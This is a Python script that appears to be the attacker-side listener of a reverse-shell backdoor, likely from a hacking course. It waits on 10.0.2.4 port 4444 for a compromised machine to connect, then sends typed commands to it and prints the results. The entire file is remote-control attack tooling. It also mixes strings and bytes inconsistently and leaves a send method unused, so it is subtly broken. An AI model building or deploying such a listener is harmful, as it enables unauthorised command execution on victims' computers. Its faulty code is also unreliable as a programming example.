#!/usr/bin/env python

import socket, json


class Listener:
    def __init__(self, host, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((host, port))
        self.listener.listen(0)
        print("Listening for incoming connections...")
        self.connection, self.address = self.listener.accept()  # Store the connection and address
        print("Connection accepted from " + str(self.address))
                
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        
    def execute_remotely(self, command):
        self.connection.send(command.encode())  # Encode the command before sending
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result.decode("utf-8"))


# Create an instance of Listener and start it
my_listener = Listener("10.0.2.4", 4444)
my_listener.run()  

